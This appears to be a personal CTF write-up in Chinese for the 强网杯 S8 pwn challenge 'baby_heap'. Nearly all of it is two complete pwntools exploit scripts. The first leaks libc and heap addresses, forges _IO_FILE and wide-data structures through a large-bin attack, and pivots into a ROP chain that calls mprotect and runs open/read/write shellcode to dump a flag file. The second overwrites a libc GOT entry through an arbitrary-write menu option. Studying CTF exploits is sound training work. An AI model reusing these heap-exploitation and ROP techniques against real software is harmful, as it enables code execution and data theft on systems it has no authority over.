---
title: 强网杯S8 - Pwn 个人题解
published: true
---

| 目录跳转: |
|--------|
| [PWN: baby_heap 通解 - 附Exp](#pwn-baby_heap-通解) |
| [PWN: baby_heap 特解 - 附Exp](#pwn-baby_heap-特解) |

# [](#header-3)pwn baby_heap 通解

这个题很适合当 large bin 大堆溢出打 House of Happy 2 链的板子题. 但是如果真这样做，会绕很多弯路，最优解应该是利用到 Secret Shop 修改 got 表  
通解没有利用到 Secret Shop 

```py
#by leeya_bug

from pwn import *
import time
import os

SLEEP_TIME = 0.2

context.os = 'linux'
context.log_level = "debug"
x64_32 = True
context.arch = 'amd64' if x64_32 else 'i386'
#context.terminal = ['gnome-terminal','-x','sh','-c']

p = process('./debug/qwb_babyheap')
libc = ELF('./glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')

def debug1():
	os.system(f'pwndbg -p {p.pid}')
	
def debug2():
	gdb.attach(p)
	p.interactive()
	
#------------- 基本配置 -------------

def add_com(size: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'1')
	p.sendlineafter(b'size', str(size).encode())
	
def del_com(index: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'2')
	p.sendlineafter(b'delete:', str(index).encode())
	
def edit_com(index: int, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'3')
	p.sendlineafter(b'edit:', str(index).encode())
	p.sendlineafter(b'Input the content', content)
	
def show_com(index: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'4')
	p.sendlineafter(b'show:', str(index).encode())
	p.recvuntil(b'The content is here \n')
	return p.recvuntil(b'Menu:')

add_com(0x548)
add_com(0x548)
add_com(0x538)
del_com(1)
add_com(0x558)
del_com(3)

content = show_com(1)
libc_addr 	= u64(content[:8]) - 0x21b120
libc.address 	= libc_addr
heap_addr 	= u64(content[16:24])
heap_base_addr 	= heap_addr - 0x1950

leave_ret_c 	= next(libc.search(asm('leave;ret;')))
'''call [[[rdi + 0x48] + 0x18] + 0x28]; move rdi, [[rdi + 0x48] + 0x10]'''
magic_gadget 	= next(libc.search(asm('mov rbp, qword ptr [rdi + 0x48];mov rax, qword ptr [rbp + 0x18]')))
rdi_c 		= next(libc.search(asm('pop rdi;ret;')))
rsi_c 		= next(libc.search(asm('pop rsi;ret;')))
rdx_r12_c 	= next(libc.search(asm('pop rdx;pop r12;ret;')))
lock 		= libc_addr + 0x3ed8b0
wfile 		= libc_addr + 0x216F40

start_addr 	= heap_addr
widedata_addr 	= start_addr + 0xe0
orw_addr 	= start_addr + 0xe0 + 0xe8 + 0x70
shell_addr	= start_addr + 0xe0 + 0xe8 + 0x70 + 0x68

# 伪造 struct _IO_FILE_complete_plus
struct_file = flat({
	# struct _IO_FILE_complete -> _IO_FILE
	0:      0,  						# file._flag
	0x18:   p64(leave_ret_c),				# file._IO_read_base
	0x28:   p64(libc.symbols['_IO_list_all'] - 0x20),	# file._IO_write_ptr
	0x48: 	p64(orw_addr),  				# file._IO_save_base
	0x88:   p64(lock),                 			# file._lock
	# struct _IO_FILE_complete
	0xa0:   p64(widedata_addr),                  		# file._wide_data 
	# struct
	0xd8:   p64(wfile),					# file._vtable
}, filler=b'\0')

# 伪造 struct _IO_wide_data
struct_widedata  = flat({
	0xe0:	p64(widedata_addr + 0xe8),			# _IO_wide_data._IO_read_ptr
	0x150:	p64(magic_gadget),				# 
}, filler=b'\0')

orw =  b'./flag\x00\x00'
orw += p64(rdx_r12_c) + p64(0) + p64(start_addr - 0x10)
# 调用 mprotect, 修改 heap_base_addr ~ heap_base_addr + 0x10000 为rwx
orw += p64(rdi_c) + p64(heap_base_addr)
orw += p64(rsi_c) + p64(0x10000) 
orw += p64(rdx_r12_c) + p64(0x7) * 2
orw += p64(libc.symbols['mprotect'])
orw += p64(shell_addr)
''' long syscall(SYS_openat2, int dirfd, const char *pathname, struct open_how *how, size_t size); '''
orw += asm(shellcraft.openat2(-100, orw_addr, orw_addr + 0x1000, 0x18))
''' ssize_t read(int fd, void buf[.count], size_t count); '''
orw += asm(shellcraft.read(3, heap_base_addr + 0x10000, 0x50))
''' ssize_t write(int fd, const void buf[.count], size_t count); '''
''' stdout '''
orw += asm(shellcraft.write(1, heap_base_addr + 0x10000, 0x50))
orw += asm(shellcraft.exit(0))

payload = struct_file + struct_widedata + orw

edit_com(1, payload[16:])

add_com(0x568)
add_com(0x538)
show_com(2)

```

# [](#header-3)pwn baby_heap 特解

```py
#by leeya_bug

from pwn import *
import time

SLEEP_TIME = 0.2

p = process('./debug/qwb_babyheap')
libc = ELF('./glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')

def debug():
	gdb.attach(p)
	p.interactive()
	
#------------- 基本配置 -------------


def add_com(size: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'1')
	p.sendlineafter(b'size', str(size).encode())
	
def del_com(index: int) -> None:
	p.sendlineafter(b'Enter your choice:',b'2')
	p.sendlineafter(b'delete:', str(index).encode())
	
def edit_com(index: int, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'3')
	p.sendlineafter(b'edit:', str(index).encode())
	p.sendlineafter(b'Input the content', content)
	
def show_com(index: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'4')
	p.sendlineafter(b'show:', str(index).encode())
	p.recvuntil(b'The content is here \n')
	return p.recvuntil(b'Menu:')
	
def print_env(chose: int) -> bytes:
	p.sendlineafter(b'Enter your choice:',b'5')
	p.sendlineafter(b'sad !', str(chose).encode())
	return p.recvuntil(b'Menu:')
	
def secret(target_addr: bytes, content: bytes) -> None:
	p.sendlineafter(b'Enter your choice:',b'6')
	p.sendafter(b'target addr', target_addr)
	time.sleep(SLEEP_TIME)
	p.send(content)
	
add_com(1300)
add_com(1300)
del_com(1)
content = show_com(1)

libc_addr = u64(content[:8]) - 0x21ace0
libc.address = libc_addr
secret(p64(libc.got['strncmp']), p64(libc.symbols['puts']))

print(print_env(2))
```